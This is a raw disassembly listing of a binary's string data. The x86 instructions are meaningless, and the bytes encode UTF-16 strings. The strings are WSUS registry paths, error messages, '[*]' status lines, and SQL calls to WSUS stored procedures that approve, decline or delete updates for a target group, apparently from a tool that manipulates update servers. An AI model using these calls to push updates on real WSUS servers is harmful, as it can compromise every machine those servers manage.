  40b1b0:	00 6f 00             	add    %ch,0x0(%edi)
  40b1b3:	76 00                	jbe    0x40b1b5
  40b1b5:	65 00 43 00          	add    %al,%gs:0x0(%ebx)
  40b1b9:	6f                   	outsl  %ds:(%esi),(%dx)
  40b1ba:	00 6d 00             	add    %ch,0x0(%ebp)
  40b1bd:	70 00                	jo     0x40b1bf
  40b1bf:	75 00                	jne    0x40b1c1
  40b1c1:	74 00                	je     0x40b1c3
  40b1c3:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b1c7:	46                   	inc    %esi
  40b1c8:	00 72 00             	add    %dh,0x0(%edx)
  40b1cb:	6f                   	outsl  %ds:(%esi),(%dx)
  40b1cc:	00 6d 00             	add    %ch,0x0(%ebp)
  40b1cf:	47                   	inc    %edi
  40b1d0:	00 72 00             	add    %dh,0x0(%edx)
  40b1d3:	6f                   	outsl  %ds:(%esi),(%dx)
  40b1d4:	00 75 00             	add    %dh,0x0(%ebp)
  40b1d7:	70 00                	jo     0x40b1d9
  40b1d9:	2e 00 01             	add    %al,%cs:(%ecx)
  40b1dc:	5f                   	pop    %edi
  40b1dd:	53                   	push   %ebx
  40b1de:	00 4f 00             	add    %cl,0x0(%edi)
  40b1e1:	46                   	inc    %esi
  40b1e2:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
  40b1e6:	00 41 00             	add    %al,0x0(%ecx)
  40b1e9:	52                   	push   %edx
  40b1ea:	00 45 00             	add    %al,0x0(%ebp)
  40b1ed:	5c                   	pop    %esp
  40b1ee:	00 4d 00             	add    %cl,0x0(%ebp)
  40b1f1:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  40b1f7:	6f                   	outsl  %ds:(%esi),(%dx)
  40b1f8:	00 73 00             	add    %dh,0x0(%ebx)
  40b1fb:	6f                   	outsl  %ds:(%esi),(%dx)
  40b1fc:	00 66 00             	add    %ah,0x0(%esi)
  40b1ff:	74 00                	je     0x40b201
  40b201:	5c                   	pop    %esp
  40b202:	00 55 00             	add    %dl,0x0(%ebp)
  40b205:	70 00                	jo     0x40b207
  40b207:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40b20b:	74 00                	je     0x40b20d
  40b20d:	65 00 20             	add    %ah,%gs:(%eax)
  40b210:	00 53 00             	add    %dl,0x0(%ebx)
  40b213:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b217:	76 00                	jbe    0x40b219
  40b219:	69 00 63 00 65 00    	imul   $0x650063,(%eax),%eax
  40b21f:	73 00                	jae    0x40b221
  40b221:	5c                   	pop    %esp
  40b222:	00 53 00             	add    %dl,0x0(%ebx)
  40b225:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b229:	76 00                	jbe    0x40b22b
  40b22b:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b22f:	5c                   	pop    %esp
  40b230:	00 73 00             	add    %dh,0x0(%ebx)
  40b233:	65 00 74 00 75       	add    %dh,%gs:0x75(%eax,%eax,1)
  40b238:	00 70 00             	add    %dh,0x0(%eax)
  40b23b:	00 15 43 00 6f 00    	add    %dl,0x6f0043
  40b241:	6e                   	outsb  %ds:(%esi),(%dx)
  40b242:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40b246:	00 6e 00             	add    %ch,0x0(%esi)
  40b249:	74 00                	je     0x40b24b
  40b24b:	44                   	inc    %esp
  40b24c:	00 69 00             	add    %ch,0x0(%ecx)
  40b24f:	72 00                	jb     0x40b251
  40b251:	00 29                	add    %ch,(%ecx)
  40b253:	45                   	inc    %ebp
  40b254:	00 52 00             	add    %dl,0x0(%edx)
  40b257:	52                   	push   %edx
  40b258:	00 4f 00             	add    %cl,0x0(%edi)
  40b25b:	52                   	push   %edx
  40b25c:	00 5f 00             	add    %bl,0x0(%edi)
  40b25f:	46                   	inc    %esi
  40b260:	00 49 00             	add    %cl,0x0(%ecx)
  40b263:	4c                   	dec    %esp
  40b264:	00 45 00             	add    %al,0x0(%ebp)
  40b267:	5f                   	pop    %edi
  40b268:	00 4e 00             	add    %cl,0x0(%esi)
  40b26b:	4f                   	dec    %edi
  40b26c:	00 54 00 5f          	add    %dl,0x5f(%eax,%eax,1)
  40b270:	00 46 00             	add    %al,0x0(%esi)
  40b273:	4f                   	dec    %edi
  40b274:	00 55 00             	add    %dl,0x0(%ebp)
  40b277:	4e                   	dec    %esi
  40b278:	00 44 00 00          	add    %al,0x0(%eax,%eax,1)
  40b27c:	80 83 53 00 6f 00 6d 	addb   $0x6d,0x6f0053(%ebx)
  40b283:	00 65 00             	add    %ah,0x0(%ebp)
  40b286:	74 00                	je     0x40b288
  40b288:	68 00 69 00 6e       	push   $0x6e006900
  40b28d:	00 67 00             	add    %ah,0x0(%edi)
  40b290:	20 00                	and    %al,(%eax)
  40b292:	77 00                	ja     0x40b294
  40b294:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40b298:	74 00                	je     0x40b29a
  40b29a:	20 00                	and    %al,(%eax)
  40b29c:	77 00                	ja     0x40b29e
  40b29e:	72 00                	jb     0x40b2a0
  40b2a0:	6f                   	outsl  %ds:(%esi),(%dx)
  40b2a1:	00 6e 00             	add    %ch,0x0(%esi)
  40b2a4:	67 00 2c             	add    %ch,(%si)
  40b2a7:	00 20                	add    %ah,(%eax)
  40b2a9:	00 75 00             	add    %dh,0x0(%ebp)
  40b2ac:	6e                   	outsb  %ds:(%esi),(%dx)
  40b2ad:	00 61 00             	add    %ah,0x0(%ecx)
  40b2b0:	62 00                	bound  %eax,(%eax)
  40b2b2:	6c                   	insb   (%dx),%es:(%edi)
  40b2b3:	00 65 00             	add    %ah,0x0(%ebp)
  40b2b6:	20 00                	and    %al,(%eax)
  40b2b8:	74 00                	je     0x40b2ba
  40b2ba:	6f                   	outsl  %ds:(%esi),(%dx)
  40b2bb:	00 20                	add    %ah,(%eax)
  40b2bd:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40b2c1:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40b2c5:	00 63 00             	add    %ah,0x0(%ebx)
  40b2c8:	74 00                	je     0x40b2ca
  40b2ca:	20 00                	and    %al,(%eax)
  40b2cc:	53                   	push   %ebx
  40b2cd:	00 51 00             	add    %dl,0x0(%ecx)
  40b2d0:	4c                   	dec    %esp
  40b2d1:	00 20                	add    %ah,(%eax)
  40b2d3:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40b2d7:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  40b2db:	00 69 00             	add    %ch,0x0(%ecx)
  40b2de:	6c                   	insb   (%dx),%es:(%edi)
  40b2df:	00 73 00             	add    %dh,0x0(%ebx)
  40b2e2:	20 00                	and    %al,(%eax)
  40b2e4:	66 00 72 00          	data16 add %dh,0x0(%edx)
  40b2e8:	6f                   	outsl  %ds:(%esi),(%dx)
  40b2e9:	00 6d 00             	add    %ch,0x0(%ebp)
  40b2ec:	20 00                	and    %al,(%eax)
  40b2ee:	72 00                	jb     0x40b2f0
  40b2f0:	65 00 67 00          	add    %ah,%gs:0x0(%edi)
  40b2f4:	69 00 73 00 74 00    	imul   $0x740073,(%eax),%eax
  40b2fa:	72 00                	jb     0x40b2fc
  40b2fc:	79 00                	jns    0x40b2fe
  40b2fe:	2e 00 00             	add    %al,%cs:(%eax)
  40b301:	13 4c 00 6f          	adc    0x6f(%eax,%eax,1),%ecx
  40b305:	00 63 00             	add    %ah,0x0(%ebx)
  40b308:	61                   	popa
  40b309:	00 6c 00 48          	add    %ch,0x48(%eax,%eax,1)
  40b30d:	00 6f 00             	add    %ch,0x0(%edi)
  40b310:	73 00                	jae    0x40b312
  40b312:	74 00                	je     0x40b314
  40b314:	00 1b                	add    %bl,(%ebx)
  40b316:	53                   	push   %ebx
  40b317:	00 71 00             	add    %dh,0x0(%ecx)
  40b31a:	6c                   	insb   (%dx),%es:(%edi)
  40b31b:	00 53 00             	add    %dl,0x0(%ebx)
  40b31e:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b322:	76 00                	jbe    0x40b324
  40b324:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b328:	4e                   	dec    %esi
  40b329:	00 61 00             	add    %ah,0x0(%ecx)
  40b32c:	6d                   	insl   (%dx),%es:(%edi)
  40b32d:	00 65 00             	add    %ah,0x0(%ebp)
  40b330:	00 1f                	add    %bl,(%edi)
  40b332:	53                   	push   %ebx
  40b333:	00 71 00             	add    %dh,0x0(%ecx)
  40b336:	6c                   	insb   (%dx),%es:(%edi)
  40b337:	00 44 00 61          	add    %al,0x61(%eax,%eax,1)
  40b33b:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  40b33f:	00 62 00             	add    %ah,0x0(%edx)
  40b342:	61                   	popa
  40b343:	00 73 00             	add    %dh,0x0(%ebx)
  40b346:	65 00 4e 00          	add    %cl,%gs:0x0(%esi)
  40b34a:	61                   	popa
  40b34b:	00 6d 00             	add    %ch,0x0(%ebp)
  40b34e:	65 00 00             	add    %al,%gs:(%eax)
  40b351:	59                   	pop    %ecx
  40b352:	53                   	push   %ebx
  40b353:	00 4f 00             	add    %cl,0x0(%edi)
  40b356:	46                   	inc    %esi
  40b357:	00 54 00 57          	add    %dl,0x57(%eax,%eax,1)
  40b35b:	00 41 00             	add    %al,0x0(%ecx)
  40b35e:	52                   	push   %edx
  40b35f:	00 45 00             	add    %al,0x0(%ebp)
  40b362:	5c                   	pop    %esp
  40b363:	00 4d 00             	add    %cl,0x0(%ebp)
  40b366:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  40b36c:	6f                   	outsl  %ds:(%esi),(%dx)
  40b36d:	00 73 00             	add    %dh,0x0(%ebx)
  40b370:	6f                   	outsl  %ds:(%esi),(%dx)
  40b371:	00 66 00             	add    %ah,0x0(%esi)
  40b374:	74 00                	je     0x40b376
  40b376:	5c                   	pop    %esp
  40b377:	00 57 00             	add    %dl,0x0(%edi)
  40b37a:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  40b380:	6f                   	outsl  %ds:(%esi),(%dx)
  40b381:	00 77 00             	add    %dh,0x0(%edi)
  40b384:	73 00                	jae    0x40b386
  40b386:	20 00                	and    %al,(%eax)
  40b388:	4e                   	dec    %esi
  40b389:	00 54 00 5c          	add    %dl,0x5c(%eax,%eax,1)
  40b38d:	00 43 00             	add    %al,0x0(%ebx)
  40b390:	75 00                	jne    0x40b392
  40b392:	72 00                	jb     0x40b394
  40b394:	72 00                	jb     0x40b396
  40b396:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40b39a:	74 00                	je     0x40b39c
  40b39c:	56                   	push   %esi
  40b39d:	00 65 00             	add    %ah,0x0(%ebp)
  40b3a0:	72 00                	jb     0x40b3a2
  40b3a2:	73 00                	jae    0x40b3a4
  40b3a4:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40b3aa:	00 17                	add    %dl,(%edi)
  40b3ac:	50                   	push   %eax
  40b3ad:	00 72 00             	add    %dh,0x0(%edx)
  40b3b0:	6f                   	outsl  %ds:(%esi),(%dx)
  40b3b1:	00 64 00 75          	add    %ah,0x75(%eax,%eax,1)
  40b3b5:	00 63 00             	add    %ah,0x0(%ebx)
  40b3b8:	74 00                	je     0x40b3ba
  40b3ba:	4e                   	dec    %esi
  40b3bb:	00 61 00             	add    %ah,0x0(%ecx)
  40b3be:	6d                   	insl   (%dx),%es:(%edi)
  40b3bf:	00 65 00             	add    %ah,0x0(%ebp)
  40b3c2:	00 65 53             	add    %ah,0x53(%ebp)
  40b3c5:	00 6f 00             	add    %ch,0x0(%edi)
  40b3c8:	6d                   	insl   (%dx),%es:(%edi)
  40b3c9:	00 65 00             	add    %ah,0x0(%ebp)
  40b3cc:	74 00                	je     0x40b3ce
  40b3ce:	68 00 69 00 6e       	push   $0x6e006900
  40b3d3:	00 67 00             	add    %ah,0x0(%edi)
  40b3d6:	20 00                	and    %al,(%eax)
  40b3d8:	77 00                	ja     0x40b3da
  40b3da:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  40b3de:	74 00                	je     0x40b3e0
  40b3e0:	20 00                	and    %al,(%eax)
  40b3e2:	77 00                	ja     0x40b3e4
  40b3e4:	72 00                	jb     0x40b3e6
  40b3e6:	6f                   	outsl  %ds:(%esi),(%dx)
  40b3e7:	00 6e 00             	add    %ch,0x0(%esi)
  40b3ea:	67 00 2c             	add    %ch,(%si)
  40b3ed:	00 20                	add    %ah,(%eax)
  40b3ef:	00 75 00             	add    %dh,0x0(%ebp)
  40b3f2:	6e                   	outsb  %ds:(%esi),(%dx)
  40b3f3:	00 61 00             	add    %ah,0x0(%ecx)
  40b3f6:	62 00                	bound  %eax,(%eax)
  40b3f8:	6c                   	insb   (%dx),%es:(%edi)
  40b3f9:	00 65 00             	add    %ah,0x0(%ebp)
  40b3fc:	20 00                	and    %al,(%eax)
  40b3fe:	74 00                	je     0x40b400
  40b400:	6f                   	outsl  %ds:(%esi),(%dx)
  40b401:	00 20                	add    %ah,(%eax)
  40b403:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40b407:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40b40b:	00 63 00             	add    %ah,0x0(%ebx)
  40b40e:	74 00                	je     0x40b410
  40b410:	20 00                	and    %al,(%eax)
  40b412:	4f                   	dec    %edi
  40b413:	00 53 00             	add    %dl,0x0(%ebx)
  40b416:	20 00                	and    %al,(%eax)
  40b418:	76 00                	jbe    0x40b41a
  40b41a:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b41e:	73 00                	jae    0x40b420
  40b420:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40b426:	2e 00 00             	add    %al,%cs:(%eax)
  40b429:	11 55 00             	adc    %edx,0x0(%ebp)
  40b42c:	73 00                	jae    0x40b42e
  40b42e:	69 00 6e 00 67 00    	imul   $0x67006e,(%eax),%eax
  40b434:	53                   	push   %ebx
  40b435:	00 53 00             	add    %dl,0x0(%ebx)
  40b438:	4c                   	dec    %esp
  40b439:	00 00                	add    %al,(%eax)
  40b43b:	05 30 00 31 00       	add    $0x310030,%eax
  40b440:	00 3f                	add    %bh,(%edi)
  40b442:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40b446:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40b44a:	20 00                	and    %al,(%eax)
  40b44c:	73 00                	jae    0x40b44e
  40b44e:	70 00                	jo     0x40b450
  40b450:	44                   	inc    %esp
  40b451:	00 65 00             	add    %ah,0x0(%ebp)
  40b454:	70 00                	jo     0x40b456
  40b456:	6c                   	insb   (%dx),%es:(%edi)
  40b457:	00 6f 00             	add    %ch,0x0(%edi)
  40b45a:	79 00                	jns    0x40b45c
  40b45c:	55                   	push   %ebp
  40b45d:	00 70 00             	add    %dh,0x0(%eax)
  40b460:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40b464:	74 00                	je     0x40b466
  40b466:	65 00 20             	add    %ah,%gs:(%eax)
  40b469:	00 40 00             	add    %al,0x0(%eax)
  40b46c:	75 00                	jne    0x40b46e
  40b46e:	70 00                	jo     0x40b470
  40b470:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40b474:	74 00                	je     0x40b476
  40b476:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  40b47a:	44                   	inc    %esp
  40b47b:	00 3d 00 27 00 01    	add    %bh,0x1002700
  40b481:	65 27                	gs daa
  40b483:	00 2c 00             	add    %ch,(%eax,%eax,1)
  40b486:	40                   	inc    %eax
  40b487:	00 72 00             	add    %dh,0x0(%edx)
  40b48a:	65 00 76 00          	add    %dh,%gs:0x0(%esi)
  40b48e:	69 00 73 00 69 00    	imul   $0x690073,(%eax),%eax
  40b494:	6f                   	outsl  %ds:(%esi),(%dx)
  40b495:	00 6e 00             	add    %ch,0x0(%esi)
  40b498:	4e                   	dec    %esi
  40b499:	00 75 00             	add    %dh,0x0(%ebp)
  40b49c:	6d                   	insl   (%dx),%es:(%edi)
  40b49d:	00 62 00             	add    %ah,0x0(%edx)
  40b4a0:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b4a4:	3d 00 32 00 30       	cmp    $0x30003200,%eax
  40b4a9:	00 34 00             	add    %dh,(%eax,%eax,1)
  40b4ac:	2c 00                	sub    $0x0,%al
  40b4ae:	40                   	inc    %eax
  40b4af:	00 61 00             	add    %ah,0x0(%ecx)
  40b4b2:	63 00                	arpl   %eax,(%eax)
  40b4b4:	74 00                	je     0x40b4b6
  40b4b6:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40b4bc:	49                   	dec    %ecx
  40b4bd:	00 44 00 3d          	add    %al,0x3d(%eax,%eax,1)
  40b4c1:	00 30                	add    %dh,(%eax)
  40b4c3:	00 2c 00             	add    %ch,(%eax,%eax,1)
  40b4c6:	40                   	inc    %eax
  40b4c7:	00 74 00 61          	add    %dh,0x61(%eax,%eax,1)
  40b4cb:	00 72 00             	add    %dh,0x0(%edx)
  40b4ce:	67 00 65 00          	add    %ah,0x0(%di)
  40b4d2:	74 00                	je     0x40b4d4
  40b4d4:	47                   	inc    %edi
  40b4d5:	00 72 00             	add    %dh,0x0(%edx)
  40b4d8:	6f                   	outsl  %ds:(%esi),(%dx)
  40b4d9:	00 75 00             	add    %dh,0x0(%ebp)
  40b4dc:	70 00                	jo     0x40b4de
  40b4de:	49                   	dec    %ecx
  40b4df:	00 44 00 3d          	add    %al,0x3d(%eax,%eax,1)
  40b4e3:	00 27                	add    %ah,(%edi)
  40b4e5:	00 01                	add    %al,(%ecx)
  40b4e7:	1f                   	pop    %ds
  40b4e8:	27                   	daa
  40b4e9:	00 2c 00             	add    %ch,(%eax,%eax,1)
  40b4ec:	40                   	inc    %eax
  40b4ed:	00 61 00             	add    %ah,0x0(%ecx)
  40b4f0:	64 00 6d 00          	add    %ch,%fs:0x0(%ebp)
  40b4f4:	69 00 6e 00 4e 00    	imul   $0x4e006e,(%eax),%eax
  40b4fa:	61                   	popa
  40b4fb:	00 6d 00             	add    %ch,0x0(%ebp)
  40b4fe:	65 00 3d 00 4e 00 27 	add    %bh,%gs:0x27004e00
  40b505:	00 01                	add    %al,(%ecx)
  40b507:	80 83 27 00 2c 00 40 	addb   $0x40,0x2c0027(%ebx)
  40b50e:	00 69 00             	add    %ch,0x0(%ecx)
  40b511:	73 00                	jae    0x40b513
  40b513:	41                   	inc    %ecx
  40b514:	00 73 00             	add    %dh,0x0(%ebx)
  40b517:	73 00                	jae    0x40b519
  40b519:	69 00 67 00 6e 00    	imul   $0x6e0067,(%eax),%eax
  40b51f:	65 00 64 00 3d       	add    %ah,%gs:0x3d(%eax,%eax,1)
  40b524:	00 31                	add    %dh,(%ecx)
  40b526:	00 2c 00             	add    %ch,(%eax,%eax,1)
  40b529:	40                   	inc    %eax
  40b52a:	00 64 00 6f          	add    %ah,0x6f(%eax,%eax,1)
  40b52e:	00 77 00             	add    %dh,0x0(%edi)
  40b531:	6e                   	outsb  %ds:(%esi),(%dx)
  40b532:	00 6c 00 6f          	add    %ch,0x6f(%eax,%eax,1)
  40b536:	00 61 00             	add    %ah,0x0(%ecx)
  40b539:	64 00 50 00          	add    %dl,%fs:0x0(%eax)
  40b53d:	72 00                	jb     0x40b53f
  40b53f:	69 00 6f 00 72 00    	imul   $0x72006f,(%eax),%eax
  40b545:	69 00 74 00 79 00    	imul   $0x790074,(%eax),%eax
  40b54b:	3d 00 31 00 2c       	cmp    $0x2c003100,%eax
  40b550:	00 40 00             	add    %al,0x0(%eax)
  40b553:	66 00 61 00          	data16 add %ah,0x0(%ecx)
  40b557:	69 00 6c 00 49 00    	imul   $0x49006c,(%eax),%eax
  40b55d:	66 00 52 00          	data16 add %dl,0x0(%edx)
  40b561:	65 00 70 00          	add    %dh,%gs:0x0(%eax)
  40b565:	6c                   	insb   (%dx),%es:(%edi)
  40b566:	00 69 00             	add    %ch,0x0(%ecx)
  40b569:	63 00                	arpl   %eax,(%eax)
  40b56b:	61                   	popa
  40b56c:	00 3d 00 30 00 2c    	add    %bh,0x2c003000
  40b572:	00 40 00             	add    %al,0x0(%eax)
  40b575:	69 00 73 00 52 00    	imul   $0x520073,(%eax),%eax
  40b57b:	65 00 70 00          	add    %dh,%gs:0x0(%eax)
  40b57f:	6c                   	insb   (%dx),%es:(%edi)
  40b580:	00 69 00             	add    %ch,0x0(%ecx)
  40b583:	63 00                	arpl   %eax,(%eax)
  40b585:	61                   	popa
  40b586:	00 3d 00 30 00 01    	add    %bh,0x1003000
  40b58c:	1f                   	pop    %ds
  40b58d:	41                   	inc    %ecx
  40b58e:	00 70 00             	add    %dh,0x0(%eax)
  40b591:	70 00                	jo     0x40b593
  40b593:	72 00                	jb     0x40b595
  40b595:	6f                   	outsl  %ds:(%esi),(%dx)
  40b596:	00 76 00             	add    %dh,0x0(%esi)
  40b599:	65 00 64 00 20       	add    %ah,%gs:0x20(%eax,%eax,1)
  40b59e:	00 55 00             	add    %dl,0x0(%ebp)
  40b5a1:	70 00                	jo     0x40b5a3
  40b5a3:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40b5a7:	74 00                	je     0x40b5a9
  40b5a9:	65 00 00             	add    %al,%gs:(%eax)
  40b5ac:	47                   	inc    %edi
  40b5ad:	0d 00 0a 00 46       	or     $0x46000a00,%eax
  40b5b2:	00 75 00             	add    %dh,0x0(%ebp)
  40b5b5:	6e                   	outsb  %ds:(%esi),(%dx)
  40b5b6:	00 63 00             	add    %ah,0x0(%ebx)
  40b5b9:	74 00                	je     0x40b5bb
  40b5bb:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40b5c1:	20 00                	and    %al,(%eax)
  40b5c3:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b5c7:	72 00                	jb     0x40b5c9
  40b5c9:	6f                   	outsl  %ds:(%esi),(%dx)
  40b5ca:	00 72 00             	add    %dh,0x0(%edx)
  40b5cd:	20 00                	and    %al,(%eax)
  40b5cf:	2d 00 20 00 46       	sub    $0x46002000,%eax
  40b5d4:	00 62 00             	add    %ah,0x0(%edx)
  40b5d7:	41                   	inc    %ecx
  40b5d8:	00 70 00             	add    %dh,0x0(%eax)
  40b5db:	70 00                	jo     0x40b5dd
  40b5dd:	72 00                	jb     0x40b5df
  40b5df:	6f                   	outsl  %ds:(%esi),(%dx)
  40b5e0:	00 76 00             	add    %dh,0x0(%esi)
  40b5e3:	65 00 55 00          	add    %dl,%gs:0x0(%ebp)
  40b5e7:	70 00                	jo     0x40b5e9
  40b5e9:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40b5ed:	74 00                	je     0x40b5ef
  40b5ef:	65 00 2e             	add    %ch,%gs:(%esi)
  40b5f2:	00 01                	add    %al,(%ecx)
  40b5f4:	41                   	inc    %ecx
  40b5f5:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40b5f9:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40b5fd:	20 00                	and    %al,(%eax)
  40b5ff:	73 00                	jae    0x40b601
  40b601:	70 00                	jo     0x40b603
  40b603:	44                   	inc    %esp
  40b604:	00 65 00             	add    %ah,0x0(%ebp)
  40b607:	63 00                	arpl   %eax,(%eax)
  40b609:	6c                   	insb   (%dx),%es:(%edi)
  40b60a:	00 69 00             	add    %ch,0x0(%ecx)
  40b60d:	6e                   	outsb  %ds:(%esi),(%dx)
  40b60e:	00 65 00             	add    %ah,0x0(%ebp)
  40b611:	55                   	push   %ebp
  40b612:	00 70 00             	add    %dh,0x0(%eax)
  40b615:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40b619:	74 00                	je     0x40b61b
  40b61b:	65 00 20             	add    %ah,%gs:(%eax)
  40b61e:	00 40 00             	add    %al,0x0(%eax)
  40b621:	75 00                	jne    0x40b623
  40b623:	70 00                	jo     0x40b625
  40b625:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40b629:	74 00                	je     0x40b62b
  40b62b:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  40b62f:	44                   	inc    %esp
  40b630:	00 3d 00 27 00 01    	add    %bh,0x1002700
  40b636:	31 0d 00 0a 00 5b    	xor    %ecx,0x5b000a00
  40b63c:	00 2a                	add    %ch,(%edx)
  40b63e:	00 5d 00             	add    %bl,0x0(%ebp)
  40b641:	20 00                	and    %al,(%eax)
  40b643:	55                   	push   %ebp
  40b644:	00 70 00             	add    %dh,0x0(%eax)
  40b647:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40b64b:	74 00                	je     0x40b64d
  40b64d:	65 00 20             	add    %ah,%gs:(%eax)
  40b650:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40b654:	00 63 00             	add    %ah,0x0(%ebx)
  40b657:	6c                   	insb   (%dx),%es:(%edi)
  40b658:	00 69 00             	add    %ch,0x0(%ecx)
  40b65b:	6e                   	outsb  %ds:(%esi),(%dx)
  40b65c:	00 65 00             	add    %ah,0x0(%ebp)
  40b65f:	64 00 2e             	add    %ch,%fs:(%esi)
  40b662:	00 0d 00 0a 00 00    	add    %cl,0xa00
  40b668:	45                   	inc    %ebp
  40b669:	0d 00 0a 00 46       	or     $0x46000a00,%eax
  40b66e:	00 75 00             	add    %dh,0x0(%ebp)
  40b671:	6e                   	outsb  %ds:(%esi),(%dx)
  40b672:	00 63 00             	add    %ah,0x0(%ebx)
  40b675:	74 00                	je     0x40b677
  40b677:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40b67d:	20 00                	and    %al,(%eax)
  40b67f:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  40b683:	72 00                	jb     0x40b685
  40b685:	6f                   	outsl  %ds:(%esi),(%dx)
  40b686:	00 72 00             	add    %dh,0x0(%edx)
  40b689:	20 00                	and    %al,(%eax)
  40b68b:	2d 00 20 00 46       	sub    $0x46002000,%eax
  40b690:	00 62 00             	add    %ah,0x0(%edx)
  40b693:	44                   	inc    %esp
  40b694:	00 65 00             	add    %ah,0x0(%ebp)
  40b697:	6c                   	insb   (%dx),%es:(%edi)
  40b698:	00 65 00             	add    %ah,0x0(%ebp)
  40b69b:	74 00                	je     0x40b69d
  40b69d:	65 00 55 00          	add    %dl,%gs:0x0(%ebp)
  40b6a1:	70 00                	jo     0x40b6a3
  40b6a3:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40b6a7:	74 00                	je     0x40b6a9
  40b6a9:	65 00 2e             	add    %ch,%gs:(%esi)
  40b6ac:	00 01                	add    %al,(%ecx)
  40b6ae:	53                   	push   %ebx
  40b6af:	65 00 78 00          	add    %bh,%gs:0x0(%eax)
  40b6b3:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40b6b7:	20 00                	and    %al,(%eax)
  40b6b9:	73 00                	jae    0x40b6bb
  40b6bb:	70 00                	jo     0x40b6bd
  40b6bd:	44                   	inc    %esp
  40b6be:	00 65 00             	add    %ah,0x0(%ebp)
  40b6c1:	6c                   	insb   (%dx),%es:(%edi)
  40b6c2:	00 65 00             	add    %ah,0x0(%ebp)
  40b6c5:	74 00                	je     0x40b6c7
  40b6c7:	65 00 55 00          	add    %dl,%gs:0x0(%ebp)
  40b6cb:	70 00                	jo     0x40b6cd
  40b6cd:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40b6d1:	74 00                	je     0x40b6d3
  40b6d3:	65 00 42 00          	add    %al,%gs:0x0(%edx)
  40b6d7:	79 00                	jns    0x40b6d9
  40b6d9:	55                   	push   %ebp
  40b6da:	00 70 00             	add    %dh,0x0(%eax)
  40b6dd:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40b6e1:	74 00                	je     0x40b6e3
  40b6e3:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  40b6e7:	44                   	inc    %esp
  40b6e8:	00 20                	add    %ah,(%eax)
  40b6ea:	00 40 00             	add    %al,0x0(%eax)
  40b6ed:	75 00                	jne    0x40b6ef
  40b6ef:	70 00                	jo     0x40b6f1
  40b6f1:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40b6f5:	74 00                	je     0x40b6f7
  40b6f7:	65 00 49 00          	add    %cl,%gs:0x0(%ecx)
  40b6fb:	44                   	inc    %esp
  40b6fc:	00 3d 00 27 00 01    	add    %bh,0x1002700
  40b702:	2f                   	das
  40b703:	0d 00 0a 00 5b       	or     $0x5b000a00,%eax
  40b708:	00 2a                	add    %ch,(%edx)
  40b70a:	00 5d 00             	add    %bl,0x0(%ebp)
  40b70d:	20 00                	and    %al,(%eax)
  40b70f:	55                   	push   %ebp
  40b710:	00 70 00             	add    %dh,0x0(%eax)
  40b713:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40b717:	74 00                	je     0x40b719
  40b719:	65 00 20             	add    %ah,%gs:(%eax)
  40b71c:	00 64 00 65          	add    %ah,0x65(%eax,%eax,1)
  40b720:	00 6c 00 65          	add    %ch,0x65(%eax,%eax,1)
  40b724:	00 74 00 65          	add    %dh,0x65(%eax,%eax,1)
  40b728:	00 64 00 2e          	add    %ah,0x2e(%eax,%eax,1)
  40b72c:	00 0d 00 0a 00 00    	add    %cl,0xa00
  40b732:	81 0d 49 00 66 00 20 	orl    $0x790020,0x660049
  40b739:	00 79 00 
  40b73c:	6f                   	outsl  %ds:(%esi),(%dx)
  40b73d:	00 75 00             	add    %dh,0x0(%ebp)
  40b740:	20 00                	and    %al,(%eax)
  40b742:	61                   	popa
  40b743:	00 72 00             	add    %dh,0x0(%edx)
  40b746:	65 00 20             	add    %ah,%gs:(%eax)
  40b749:	00 69 00             	add    %ch,0x0(%ecx)
